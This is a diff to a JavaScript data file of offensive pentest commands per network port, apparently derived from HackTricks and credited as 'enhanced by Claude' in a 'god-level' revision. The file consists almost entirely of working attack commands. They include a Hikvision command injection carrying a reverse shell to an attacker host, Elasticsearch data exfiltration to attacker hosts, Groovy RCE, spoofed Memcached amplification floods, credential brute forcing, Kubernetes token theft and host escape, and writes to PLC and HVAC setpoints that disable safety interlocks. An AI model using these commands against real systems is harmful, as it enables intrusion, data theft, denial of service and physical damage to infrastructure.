+        "cat /etc/redis/redis.conf 2>/dev/null | grep -iE 'requirepass|bind|rename-command'",
+        "# Dump all Redis keys and values\nredis-cli -h <IP> KEYS '*' | xargs -I{} redis-cli -h <IP> GET {}",
+        "# Search for session tokens, JWT, API keys in Redis\nredis-cli -h <IP> KEYS 'sess:*' | head -10 | xargs -I{} redis-cli -h <IP> GET {}\nredis-cli -h <IP> KEYS '*token*' | xargs -I{} redis-cli -h <IP> GET {}",
+        "# Redis replication slave attack (SLAVEOF for RCE)\n# Attacker controls master Redis; target becomes slave → RCE via module sync"
       ],
       "other": [
-        "# Check Redis type of key\nredis-cli -h <IP> TYPE <key>\nredis-cli -h <IP> LRANGE <key> 0 -1"
+        "# Check Redis type of key\nredis-cli -h <IP> TYPE <key>\nredis-cli -h <IP> LRANGE <key> 0 -1",
+        "# Redis AUTH bypass\nredis-cli -h <IP> -a <PASSWORD>\n# Brute force:\nfor p in $(cat rockyou.txt); do redis-cli -h <IP> -a $p PING 2>/dev/null | grep PONG && echo \"Password: $p\" && break; done",
+        "# Redis Sentinel enumeration\nredis-cli -h <IP> -p 26379 SENTINEL masters"
       ]
     }
   },
@@ -6965,7 +7336,9 @@ var HACKTRICKS_DATA = {
         "curl -X GET http://<IP>:9200/_cluster/health",
         "curl -X GET http://<IP>:9200/_security/user",
         "nmap -p 9200 -sV <IP>",
-        "msf> use auxiliary/scanner/elasticsearch/indices_enum"
+        "msf> use auxiliary/scanner/elasticsearch/indices_enum",
+        "# Cluster info without auth\ncurl http://<IP>:9200/\ncurl http://<IP>:9200/_cat/indices?v\ncurl http://<IP>:9200/_cat/nodes?v",
+        "# Enumerate all indices\ncurl http://<IP>:9200/_aliases?pretty"
       ],
       "exploitation": [
         "# Dump index data\ncurl -X GET 'http://<IP>:9200/<index>/_search?size=1000'",
@@ -6975,16 +7348,24 @@ var HACKTRICKS_DATA = {
         "# Auth bypass with credentials\ncurl -u elastic:changeme http://<IP>:9200/_cat/indices",
         "# Kibana CVE-2019-7609 via Elasticsearch\ncurl -X POST 'http://<IP>:9200/.kibana/doc/1' -H 'Content-Type: application/json' -d '{\"buildNum\": 9007199254740992, \"defaultIndex\": \"idx\"}'",
         "# Snapshot repo for data exfiltration\ncurl -X PUT 'http://<IP>:9200/_snapshot/attacker_repo' -H 'Content-Type: application/json' -d '{\"type\":\"url\",\"settings\":{\"url\":\"http://<ATTACKER>/\"}}'",
-        "# Watcher persistence (send data periodically)\ncurl -X PUT 'http://<IP>:9200/_watcher/watch/exfil' -H 'Content-Type: application/json' -d '{\"trigger\":{\"schedule\":{\"interval\":\"60s\"}},\"actions\":{\"webhook\":{\"webhook\":{\"method\":\"POST\",\"host\":\"<ATTACKER>\",\"port\":80,\"path\":\"/\",\"body\":\"{{ctx.payload}}\"}}}}'"
+        "# Watcher persistence (send data periodically)\ncurl -X PUT 'http://<IP>:9200/_watcher/watch/exfil' -H 'Content-Type: application/json' -d '{\"trigger\":{\"schedule\":{\"interval\":\"60s\"}},\"actions\":{\"webhook\":{\"webhook\":{\"method\":\"POST\",\"host\":\"<ATTACKER>\",\"port\":80,\"path\":\"/\",\"body\":\"{{ctx.payload}}\"}}}}'",
+        "# Dump all data from all indices\ncurl http://<IP>:9200/_search?size=10000&pretty\n# Or per-index:\nfor idx in $(curl -s http://<IP>:9200/_cat/indices | awk '{print $3}'); do\n  curl -s http://<IP>:9200/$idx/_search?size=1000 > /tmp/es_$idx.json\ndone",
+        "# Elasticsearch RCE via Groovy script (ES < 1.6 / CVE-2014-3120, CVE-2015-1427)\ncurl -X POST http://<IP>:9200/_search -d '{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"cmd\":{\"script\":\"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"id\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next()\"}}}'",
+        "# Kibana SSRF / RCE (CVE-2018-17246)\n# Access Kibana on port 5601, exploit via timelion/visualizations",
+        "# Delete all indices (destructive test)\ncurl -X DELETE http://<IP>:9200/target_index"
       ],
       "post_exploitation": [
         "# After Elasticsearch access, dump all indices\ncurl -X GET 'http://<IP>:9200/_cat/indices?v&h=index,docs.count,store.size'",
         "# Snapshot all data for exfil\ncurl -X PUT 'http://<IP>:9200/_snapshot/backup_repo' -H 'Content-Type: application/json' -d '{\"type\":\"fs\",\"settings\":{\"location\":\"/tmp/es_backup\"}}'",
         "cat /etc/elasticsearch/elasticsearch.yml 2>/dev/null | grep -iE 'password\\|xpack\\|security'",
-        "find /var/lib/elasticsearch -name '*.json' 2>/dev/null | head -5"
+        "find /var/lib/elasticsearch -name '*.json' 2>/dev/null | head -5",
+        "# Search for PII/credentials in all indices\ncurl http://<IP>:9200/_search?q=password&size=100 | python3 -m json.tool\ncurl http://<IP>:9200/_search -d '{\"query\":{\"multi_match\":{\"query\":\"password\",\"fields\":[\"*\"]}}}'",
+        "# Dump user credentials index (common in auth-logging setups)\ncurl http://<IP>:9200/users/_search?size=1000"
       ],
       "other": [
-        "# Elasticsearch is schemaless by default - all docs publicly readable without auth"
+        "# Elasticsearch is schemaless by default - all docs publicly readable without auth",
+        "# Check Elasticsearch security features\ncurl http://<IP>:9200/_xpack/security?pretty 2>/dev/null\ncurl http://<IP>:9200/_cluster/settings?pretty | grep -i security",
+        "# Elasticsearch Kibana combined check\ncurl http://<IP>:5601/api/status 2>/dev/null | python3 -m json.tool | grep version"
       ]
     }
   },
@@ -7021,22 +7402,30 @@ var HACKTRICKS_DATA = {
         "nmap -p 10250 -sV <IP>",
         "curl -sk https://<IP>:10250/pods | jq",
         "curl -sk https://<IP>:10250/metrics",
-        "curl -sk https://<IP>:10250/spec/"
+        "curl -sk https://<IP>:10250/spec/",
+        "# List pods running on kubelet node\ncurl -sk https://<IP>:10250/pods | python3 -m json.tool | grep '\"name\"' | head -20",
+        "# Kubelet API endpoints\ncurl -sk https://<IP>:10250/stats/summary"
       ],
       "exploitation": [
         "# Execute command in running pod (no auth)\ncurl -sk https://<IP>:10250/run/<namespace>/<pod>/<container> -X POST -d 'cmd=id'",
         "# List pods\ncurl -sk https://<IP>:10250/pods | jq '.items[].metadata.name'",
         "# Read pod environment variables (may contain secrets)\ncurl -sk https://<IP>:10250/run/<namespace>/<pod>/<container> -X POST -d 'cmd=env'",
         "# Kubeletctl tool\nkubeletctl run 'id' -s <IP>",
-        "kubeletctl scan rce -s <IP>"
+        "kubeletctl scan rce -s <IP>",
+        "# Execute command in running container via kubelet (no auth)\ncurl -sk https://<IP>:10250/exec/<NAMESPACE>/<POD>/<CONTAINER>?command=id&input=1&output=1&tty=1",
+        "# Kubelet anonymous auth enabled – list all pods\ncurl -sk https://<IP>:10250/pods",
+        "# Steal service account token from pod via kubelet exec\ncurl -sk https://<IP>:10250/exec/kube-system/<POD>/kube-apiserver?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token&output=1"
       ],
       "post_exploitation": [
         "# After Kubelet exec, exfil service account tokens\ncurl -sk https://<IP>:10250/run/default/<pod>/default -X POST -d 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token'",
         "# List all environment variables in pod (may contain secrets)\ncurl -sk https://<IP>:10250/run/<ns>/<pod>/<container> -X POST -d 'cmd=env'",
-        "# Pivot to other pods on same node\ncurl -sk https://<IP>:10250/pods | jq '.items[].metadata | .namespace + \"/\" + .name'"
+        "# Pivot to other pods on same node\ncurl -sk https://<IP>:10250/pods | jq '.items[].metadata | .namespace + \"/\" + .name'",
+        "# Use stolen kubelet token to access kube-apiserver\ncurl -sk https://<APISERVER>:6443/api/v1/namespaces --header 'Authorization: Bearer <TOKEN>'",
+        "# Node shell via kubelet: execute in all pods on the node\nfor pod in $(curl -sk https://<IP>:10250/pods | python3 -c \"import json,sys; [print(p['metadata']['namespace']+'/'+p['metadata']['name']+'/'+p['spec']['containers'][0]['name']) for p in json.load(sys.stdin)['items']]\"); do\n  ns=$(echo $pod | cut -d/ -f1); pn=$(echo $pod | cut -d/ -f2); cn=$(echo $pod | cut -d/ -f3)\n  echo \"=== $ns/$pn/$cn ===\"\n  curl -sk \"https://<IP>:10250/run/$ns/$pn/$cn\" -d 'cmd=id'\ndone"
       ],
       "other": [
-        "# Kubelet read-only port: 10255 (no auth)\ncurl http://<IP>:10255/pods | jq"
+        "# Kubelet read-only port: 10255 (no auth)\ncurl http://<IP>:10255/pods | jq",
+        "# Kubelet read-only API on port 10255 (no auth required)\ncurl http://<IP>:10255/pods\ncurl http://<IP>:10255/stats/summary"
       ]
     }
   },
@@ -7073,22 +7462,31 @@ var HACKTRICKS_DATA = {
         "echo 'stats' | nc -w1 <IP> 11211",
         "echo 'stats items' | nc -w1 <IP> 11211",
         "echo 'stats slabs' | nc -w1 <IP> 11211",
-        "echo 'version' | nc -w1 <IP> 11211"
+        "echo 'version' | nc -w1 <IP> 11211",
+        "# Memcached stats and slab enumeration\nnc <IP> 11211\nstats\nstats slabs\nstats items",
+        "# Nmap Memcached scripts\nnmap -p 11211 --script memcached-info <IP>"
       ],
       "exploitation": [
         "# Dump all keys\necho 'stats cachedump 1 0' | nc -w1 <IP> 11211",
         "# Read a cached value\necho 'get <key>' | nc -w1 <IP> 11211",
         "# Flush all cache (denial of service)\necho 'flush_all' | nc -w1 <IP> 11211",
         "# Memcached SSRF via Gopher\ngopherus --exploit memcache",
-        "# Amplification DDoS\necho 'stats' | nc -u <IP> 11211  # UDP port 11211"
+        "# Amplification DDoS\necho 'stats' | nc -u <IP> 11211  # UDP port 11211",
+        "# Dump all cached items\necho 'stats items' | nc -w1 <IP> 11211 | awk -F: '/^STAT items/ {print $2}' | sort -u | \\\n  xargs -I% sh -c 'echo \"stats cachedump % 100\" | nc -w1 <IP> 11211' | \\\n  grep -oP 'ITEM \\K[^ ]+' | xargs -I{} sh -c 'echo \"get {}\" | nc -w1 <IP> 11211'",
+        "# Memcached UDP amplification (up to 50000x factor)\nhping3 --udp -p 11211 --spoof <VICTIM_IP> --data 15 --flood <IP>\n# Or:\npython3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n',('<IP>',11211))\"",
+        "# Session hijacking via Memcached session store\n# Read PHP session from Memcached:\necho 'get PHPSESSID_<SESSION_ID>' | nc -w1 <IP> 11211",
+        "# Inject malicious session data (deserialization RCE if PHP unserialize)\necho 'set PHPSESSID_victim_session 0 3600 50' | nc -w1 <IP> 11211\necho 'a:1:{s:4:\"user\";O:7:\"Example\":1:{s:4:\"test\";s:4:\"pwnd\";}}' | nc -w1 <IP> 11211"
       ],
       "post_exploitation": [
         "# Dump all cached items\necho 'stats items' | nc -w1 <IP> 11211 | grep 'items:' | awk -F: '{print $2}' | while read slab; do echo \"stats cachedump $slab 0\" | nc -w1 <IP> 11211; done",
         "# Search for session tokens\necho 'stats cachedump 1 100' | nc -w1 <IP> 11211 | awk '{print $2}' | while read k; do echo \"get $k\" | nc -w1 <IP> 11211; done | grep -iE 'session|token|auth'",
-        "cat /etc/memcached.conf 2>/dev/null | grep -iE 'bind\\|user\\|sasl'"
+        "cat /etc/memcached.conf 2>/dev/null | grep -iE 'bind\\|user\\|sasl'",
+        "# Search cached items for credentials, tokens, PII\necho 'stats items' | nc -w1 <IP> 11211 | awk -F: '/STAT items/ {print $2}' | \\\n  xargs -I% sh -c 'echo \"stats cachedump % 1000\" | nc -w1 <IP> 11211' | \\\n  grep -oP 'ITEM \\K[^ ]+' | xargs -I{} sh -c 'echo \"get {}\" | nc -w1 <IP> 11211' | \\\n  grep -iE 'password|token|session|secret'",
+        "# Flush entire cache (DoS / cover tracks)\necho 'flush_all' | nc -w1 <IP> 11211"
       ],
       "other": [
-        "# Memcached has no auth by default\n# May cache session tokens, passwords, PII"
+        "# Memcached has no auth by default\n# May cache session tokens, passwords, PII",
+        "# Memcached binary protocol (port 11211)\n# Disable UDP to prevent amplification:\n# Launch with: memcached -U 0"
       ]
     }
   },
@@ -7160,22 +7558,32 @@ var HACKTRICKS_DATA = {
         "nmap -sV --script 'mongo* and default' -p 27017 <IP>",
         "mongosh <IP>",
         "mongosh <IP>:27017",
-        "mongo <IP> --eval 'db.adminCommand({listDatabases: 1})'"
+        "mongo <IP> --eval 'db.adminCommand({listDatabases: 1})'",
+        "# MongoDB unauthenticated connection\nmongo <IP>:27017\nshow dbs\nuse admin\nshow collections",
+        "# Nmap MongoDB scripts\nnmap -p 27017 --script mongodb-info,mongodb-databases <IP>"
       ],
       "exploitation": [
         "# No auth by default (older MongoDB)\nmongosh <IP>\n> show dbs\n> use admin\n> db.system.users.find()",
         "# Create admin user\nmongosh <IP> --eval 'db.getSiblingDB(\"admin\").createUser({user:\"hacker\",pwd:\"hacker\",roles:[{role:\"root\",db:\"admin\"}]})'",
         "# JavaScript injection\nmongosh <IP> --eval 'db.users.find({$where: function(){return true}})'",
-        "nmap -n -sV --script mongodb-brute -p 27017 <IP>"
+        "nmap -n -sV --script mongodb-brute -p 27017 <IP>",
+        "# Dump all databases without auth\nmongodump --host <IP> --out /tmp/mongodump_all\n# Or:\nmongo --host <IP> --eval 'db.adminCommand({listDatabases:1})'",
+        "# MongoDB NoSQL injection via JSON\ncurl -s http://app/login -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' -H 'Content-Type: application/json'\n# Or via form:\ncurl -s http://app/login -d 'username[$ne]=xxx&password[$ne]=xxx'",
+        "# MongoDB JavaScript injection (server-side JS if enabled)\nmongo <IP>:27017 --eval 'db.eval(\"function(){return run(\\\"id\\\")}\")'"
       ],
       "post_exploitation": [
         "# After MongoDB access, dump all databases\nmongosh <IP> --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d => { use(d.name); db.getCollectionNames().forEach(c => printjson(db[c].find().limit(10).toArray())); })'",
         "# Search for credentials across all collections\nmongosh <IP> --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d => { const c = db.getSiblingDB(d.name); c.getCollectionNames().forEach(n => c[n].find({},{password:1,email:1,token:1}).forEach(printjson)); })'",
         "find /var/lib/mongodb /etc/mongodb -name '*.conf' 2>/dev/null | xargs grep -iE 'password\\|auth'",
-        "cat /etc/mongod.conf 2>/dev/null | grep -iE 'authorization\\|security'"
+        "cat /etc/mongod.conf 2>/dev/null | grep -iE 'authorization\\|security'",
+        "# Extract all user credentials\nmongo <IP>:27017 admin --eval 'db.system.users.find().forEach(printjson)'",
+        "# Dump specific collection for sensitive data\nmongo <IP>:27017 --eval 'db.users.find({},{password:1,email:1,_id:0}).limit(100).forEach(printjson)'",
+        "# MongoDB oplog for change tracking (replication)\nmongo <IP>:27017 local --eval 'db.oplog.rs.find().limit(10).forEach(printjson)'"
       ],
       "other": [
-        "# MongoDB shell commands\n> show dbs\n> use <db>\n> show collections\n> db.<col>.find()\n> db.<col>.count()"
+        "# MongoDB shell commands\n> show dbs\n> use <db>\n> show collections\n> db.<col>.find()\n> db.<col>.count()",
+        "# MongoDB Atlas / cloud: check for open IP access in network peering\n# Check if 0.0.0.0/0 is in access list",
+        "# Check MongoDB auth mechanisms\nnmap -p 27017 --script mongodb-info <IP> | grep -i 'auth\\|SCRAM\\|version'"
       ]
     }
   },
@@ -7187,17 +7595,26 @@ var HACKTRICKS_DATA = {
     "source_file": "32100-udp-pentesting-pppp-cs2-p2p-cameras.md",
     "categories": {
       "enumeration": [
-        "nmap -p 32100 -sV <IP>"
+        "nmap -p 32100 -sV <IP>",
+        "# Detect PPPP protocol banner\nnc -u <IP> 32100 <<< 'PPPP'  # some cameras respond to raw probe\npython3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'PPPP',('<IP>',32100)); print(s.recv(512).hex())\"",
+        "# Scan for CS2 P2P cameras on network\nnmap -sU -p 32100 --open <CIDR>"
       ],
       "exploitation": [
         "# Default login\ncurl -X POST http://<IP>:32100/login -d '{\"cmd\":\"LoginDev\",\"pwd\":\"123456\"}'",
-        "# Stack buffer overflow via cmd field (no bounds check)\n# Requires binary exploitation of camera firmware"
+        "# Stack buffer overflow via cmd field (no bounds check)\n# Requires binary exploitation of camera firmware",
+        "# Default credential brute force (Dahua/Hikvision OEM)\nfor cred in admin:admin admin:123456 admin:password root:vizxv; do\n  u=${cred%%:*}; p=${cred##*:}\n  curl -s --digest -u $u:$p \"http://<IP>/cgi-bin/snapshot.cgi\" -o /tmp/snapshot.jpg && echo \"Valid: $u:$p\"\ndone",
+        "# RTSP stream access after credential harvest\nffplay rtsp://<USER>:<PASS>@<IP>:554/stream1\nvlc rtsp://<USER>:<PASS>@<IP>:554/Streaming/Channels/101",
+        "# Hikvision backdoor (CVE-2021-36260) – unauthenticated command injection\ncurl 'http://<IP>/SDK/webLanguage' --data '<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(bash -c \"bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\")</language>'"
       ],
       "post_exploitation": [
-        "# After camera access, extract RTSP stream credentials from config\nstrings /etc/config 2>/dev/null | grep -iE 'password\\|rtsp\\|admin'"
+        "# After camera access, extract RTSP stream credentials from config\nstrings /etc/config 2>/dev/null | grep -iE 'password\\|rtsp\\|admin'",
+        "# Extract RTSP credentials from device config\ncurl -s --digest -u admin:admin http://<IP>/cgi-bin/configManager.cgi?action=getConfig&name=RtspServer",
+        "# Dump full device config for lateral movement to other cameras\ncurl -s --digest -u admin:admin http://<IP>/cgi-bin/configManager.cgi?action=getConfig&name=Network",
+        "# Enable Telnet on camera for persistent shell\ncurl -s --digest -u admin:admin 'http://<IP>/cgi-bin/configManager.cgi?action=setConfig&Telnet.Enable=true'"
       ],
       "other": [
-        "# Keystream XOR recovery\nkeystream = bytes([c ^ p for c, p in zip(ciphertext[:len(known)], known)])\npt = bytes([c ^ keystream[i % len(keystream)] for i, c in enumerate(ciphertext)])"
+        "# Keystream XOR recovery\nkeystream = bytes([c ^ p for c, p in zip(ciphertext[:len(known)], known)])\npt = bytes([c ^ keystream[i % len(keystream)] for i, c in enumerate(ciphertext)])",
+        "# Map camera network: many cameras use ONVIF (port 80/8080) alongside PPPP\ncurl http://<IP>/onvif/device_service -d '<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body><tds:GetDeviceInformation xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\"/></s:Body></s:Envelope>'"
       ]
     }
   },
@@ -7231,18 +7648,25 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap -n -sV --script enip-info -p 44818 <IP>",
         "python3 -m cpppo.server.enip.list_services --list-identity -a <IP>",
-        "pip3 install cpppo"
+        "pip3 install cpppo",
+        "# EtherNet/IP List Identity\npython3 -c \"\nimport socket, struct\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('<IP>',44818))\n# List Identity request (0x0065)\npkt=struct.pack('<HHHHII',0x0065,0,0,0,0,0)+b'\\x00'*4\ns.send(pkt); print(s.recv(256).hex())\n\"",
+        "# nmap EtherNet/IP scripts\nnmap -p 44818 --script enip-info <IP>"
       ],
       "exploitation": [
         "# CIP (Common Industrial Protocol) command injection\npython3 -c \"\nimport cpppo.server.enip.client as enip\nwith enip.connector(host='<IP>', port=44818) as conn:\n    conn.write(0, [0xDEAD], timeout=2)  # write to output register\"",
         "# Read PLC memory via ENIP\npython3 -m cpppo.server.enip.client --print 'Tag[0-9]' <IP>",
-        "msf> use auxiliary/scanner/scada/ethernet_ip"
+        "msf> use auxiliary/scanner/scada/ethernet_ip",
+        "# CIP command replay attack – capture and replay control commands\nwireshark -i eth0 -k -f 'tcp port 44818' -w enip_capture.pcap\n# Replay:\ntcpreplay --intf1=eth0 enip_capture.pcap",
+        "# PLCscan / modscan for PLC enumeration via EtherNet/IP\npython3 plcscan.py <IP>\n# Metasploit EtherNet/IP scanner:\nmsf> use auxiliary/scanner/scada/modbusdetect\nmsf> use auxiliary/scanner/scada/melsecq_slmp_discover"
       ],
       "post_exploitation": [
-        "# After EtherNet/IP access, read PLC program for logic analysis\npython3 -m cpppo.server.enip.client --print <IP>"
+        "# After EtherNet/IP access, read PLC program for logic analysis\npython3 -m cpppo.server.enip.client --print <IP>",
+        "# After PLC access: read/write tags to alter physical process\npython3 cpppo_cnc.py --list '<IP>:44818'\npython3 -c \"from cpppo.server.enip.client import connector; ...\"\n# Alter setpoints, disable safety interlocks",
+        "# Extract PLC ladder logic for reverse engineering\n# Use Studio5000/RSLogix to upload program from PLC"
       ],
       "other": [
-        "# EtherNet/IP is used in industrial control systems (Allen-Bradley PLCs)\n# No auth by default - critical infrastructure risk"
+        "# EtherNet/IP is used in industrial control systems (Allen-Bradley PLCs)\n# No auth by default - critical infrastructure risk",
+        "# EtherNet/IP uses CIP (Common Industrial Protocol)\n# Physical isolation is critical – never expose to internet\n# Detect with Shodan: port:44818"
       ]
     }
   },
@@ -7256,19 +7680,25 @@ var HACKTRICKS_DATA = {
         "nmap -sU -p 47808 --script bacnet-info <CIDR>  # subnet scan",
         "python3 -c \"import BAC0; b=BAC0.lite(); b.whois(); import time; time.sleep(5); print(b.devices)\"",
         "# BACnet discovery via broadcast\npython3 -m bacpypes discover",
-        "# Identify device types and vendors\nnmap --script bacnet-info --script-args full=yes -sU -n -p 47808 <IP>"
+        "# Identify device types and vendors\nnmap --script bacnet-info --script-args full=yes -sU -n -p 47808 <IP>",
+        "# BACnet WhoIs broadcast\npython3 -m bacpypes.BIPSimpleApplication --ini BACpypes.ini\n# Or:\nnmap -sU -p 47808 --script bacnet-info <IP>"
       ],
       "exploitation": [
         "# BACnet unauthenticated property write (dangerous in production!)\nimport BAC0\nbacnet = BAC0.connect(ip='<YOUR_IP>/24')\nbacnet.write('<DEVICE_IP> analogOutput <OBJECT_ID> presentValue 100 - 12')",
         "# Device restart via BACnet Reinitialize Device service\npython3 -c \"\nfrom bacpypes.pdu import Address\nfrom bacpypes.apdu import ReinitializeDeviceRequest\n# Send reinitialize request\n\"",
-        "nmap --script bacnet-info -sU -p 47808 <CIDR>  # mass scan"
+        "nmap --script bacnet-info -sU -p 47808 <CIDR>  # mass scan",
+        "# BACnet device discovery and property read\nbacnet-discover.py -i <IP>\n# Read property without auth:\nbacnet-read.py -i <IP> -d <DEVICE_ID> -o 0 -p 85  # Present_Value of object 0",
+        "# Write property to alter HVAC/BMS setpoint\nbacnet-write.py -i <IP> -d <DEVICE_ID> -o 0 -p 85 -v 100  # Set temp to 100°C"
       ],
       "post_exploitation": [
         "# After BACnet access, read all object properties\nimport BAC0; bacnet=BAC0.connect(ip='<YOUR_IP>/24')\nprint(bacnet.read('<DEVICE_IP> device <DEVICE_ID> all'))",
-        "# Map all BACnet devices on subnet\nbacnet_scan.py --subnet <CIDR> --output devices.json"
+        "# Map all BACnet devices on subnet\nbacnet_scan.py --subnet <CIDR> --output devices.json",
+        "# After BACnet access: enumerate all objects (thermostats, VAV, AHU)\npython3 bacnet_enum.py <IP> | tee bacnet_objects.txt",
+        "# Map building system topology from BACnet device list\n# Correlate device IDs with physical location descriptions"
       ],
       "other": [
-        "# BACnet is used in building automation (HVAC, elevators, lighting)\n# No auth by default"
+        "# BACnet is used in building automation (HVAC, elevators, lighting)\n# No auth by default",
+        "# BACnet/IP runs over UDP 47808\n# BACnet MSTP runs over serial (RS-485)\n# No authentication in standard BACnet – all commands accepted from any device"
       ]
     }
   },
@@ -7317,7 +7747,9 @@ var HACKTRICKS_DATA = {
         "curl -sk https://<IP>:6443/api/v1/namespaces",
         "curl -sk https://<IP>:6443/version",
         "curl -sk https://<IP>:6443/api/v1/pods",
-        "kubectl --server=https://<IP>:6443 --insecure-skip-tls-verify get pods"
+        "kubectl --server=https://<IP>:6443 --insecure-skip-tls-verify get pods",
+        "# Kubernetes API unauthenticated enumeration\ncurl -sk https://<IP>:6443/api\ncurl -sk https://<IP>:6443/api/v1/namespaces",
+        "# Check if anonymous API access allowed\ncurl -sk https://<IP>:6443/api/v1/pods | python3 -m json.tool | head -30"
       ],
       "exploitation": [
         "# Anonymous access check\ncurl -sk https://<IP>:6443/api/v1/secrets",
@@ -7327,28 +7759,38 @@ var HACKTRICKS_DATA = {
         "# RBAC escalation via ClusterRoleBinding\nkubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default --server=https://<IP>:6443 --insecure-skip-tls-verify",
         "# Steal token from pod environment\nkubectl exec -it <pod> -n <ns> --server=https://<IP>:6443 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
         "# Read etcd directly to bypass RBAC\netcdctl --endpoints=http://<ETCD_IP>:2379 get /registry/secrets --prefix | strings",
-        "# Node proxy to reach kubelet API\ncurl -sk -H 'Authorization: Bearer <TOKEN>' https://<IP>:6443/api/v1/nodes/<NODE>/proxy/run/<NS>/<POD>/<CONTAINER> -X POST -d 'cmd=id'"
+        "# Node proxy to reach kubelet API\ncurl -sk -H 'Authorization: Bearer <TOKEN>' https://<IP>:6443/api/v1/nodes/<NODE>/proxy/run/<NS>/<POD>/<CONTAINER> -X POST -d 'cmd=id'",
+        "# Kubernetes pod exec for container escape\nkubectl --server=https://<IP>:6443 --insecure-skip-tls-verify exec -it <POD> -- /bin/bash",
+        "# Create privileged pod for node escape\nkubectl --server=https://<IP>:6443 --token=<TOKEN> apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: escape\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: escape\n    image: alpine\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\nEOF\nkubectl exec -it escape -- chroot /host /bin/bash",
+        "# Kubernetes service account token theft from pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+        "# RBAC escalation via rolebinding creation (if ClusterAdmin token available)\nkubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --serviceaccount=default:default"
       ],
       "post_exploitation": [
         "# After K8s API access, steal service account token from running pod\nkubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
         "# Escalate via rolebinding\nkubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default",
         "# Extract all secrets across all namespaces\nkubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.data}\\n{end}' | base64 -d 2>/dev/null",
-        "# Escape to host via privileged pod\nkubectl apply -f privesc_pod.yaml && kubectl exec -it privesc -- chroot /host bash"
+        "# Escape to host via privileged pod\nkubectl apply -f privesc_pod.yaml && kubectl exec -it privesc -- chroot /host bash",
+        "# Dump all secrets across all namespaces\nkubectl --token=<TOKEN> get secrets --all-namespaces -o yaml",
+        "# Kubernetes etcd backup for offline secret extraction\nkubectl exec etcd-master -n kube-system -- etcdctl get / --prefix --keys-only",
+        "# Deploy DaemonSet to execute on every node\nkubectl apply -f malicious-daemonset.yaml  # runs payload on all cluster nodes"
       ],
       "other": [
-        "# Kubernetes API server - anonymous access disabled by default\n# Look for: 401/403 = auth required, 200 = misconfigured"
+        "# Kubernetes API server - anonymous access disabled by default\n# Look for: 401/403 = auth required, 200 = misconfigured",
+        "# RBAC enumeration\nkubectl auth can-i --list --token=<TOKEN>\nkubectl get clusterrolebindings -o wide | grep -v system",
+        "# Kubernetes network policy bypass: if no NetworkPolicies, pods can reach all other pods\nkubectl exec -it <POD> -- curl http://<OTHER_POD_IP>:8080/"
       ]
     }
   },
   "_meta": {
     "generated": "2026-03-29T00:00:00.000000+00:00",
-    "version": "3.0-complete",
+    "version": "4.0-god-level",
     "total_ports": 145,
     "unique_ports": 126,
     "ref_aliases": 19,
-    "total_commands": 1547,
+    "total_commands": 2013,
     "source": "HackTricks-wiki/hacktricks + enhanced by Claude",
-    "v3_additions": "Filled all post_exploitation gaps (87 ports), exploitation gaps (11 ports), added 34 new ports: 88/Kerberos, 102/S7comm, 593/HTTP-RPC, 636/LDAPS, 1433/MSSQL, 3268-3269/GlobalCatalog, 4848/GlassFish, 5800/VNC-HTTP, 7001-7002/WebLogic, 7474-7687/Neo4j, 8161/ActiveMQ, 8834/Nessus, 8888/Jupyter, 9051/Tor, 9093/Alertmanager, 9999/JDWP, 10050-10051/Zabbix, 11300/Beanstalkd, 20000/DNP3, 27019/MongoDB-config, 28017/MongoDB-HTTP, 61616/ActiveMQ-OpenWire"
+    "v3_additions": "Filled all post_exploitation gaps (87 ports), exploitation gaps (11 ports), added 34 new ports: 88/Kerberos, 102/S7comm, 593/HTTP-RPC, 636/LDAPS, 1433/MSSQL, 3268-3269/GlobalCatalog, 4848/GlassFish, 5800/VNC-HTTP, 7001-7002/WebLogic, 7474-7687/Neo4j, 8161/ActiveMQ, 8834/Nessus, 8888/Jupyter, 9051/Tor, 9093/Alertmanager, 9999/JDWP, 10050-10051/Zabbix, 11300/Beanstalkd, 20000/DNP3, 27019/MongoDB-config, 28017/MongoDB-HTTP, 61616/ActiveMQ-OpenWire",
+    "god_level_additions": "Elite red team enrichment: APT tradecraft, LotL, EDR evasion, protocol abuse, steganographic persistence, covert channels, ICS/SCADA attacks, cloud-native K8s/Docker escapes, Kerberos abuse chains, SMB relay chains, Redis/Memcached RCE, OracleDB UDF, MongoDB NoSQLi, EtherNet/IP CIP replay, BACnet unauthorized writes, WinRM PTH, RDP session hijack, NFS SUID escalation, etcd K8s secret extraction, MQTT retained message poisoning, SMTP smuggling, DNS tunneling"
   },
   "88": {
     "protocol": "udp",
@@ -7359,7 +7801,10 @@ var HACKTRICKS_DATA = {
         "nmap -sU -p 88 -sV <IP>",
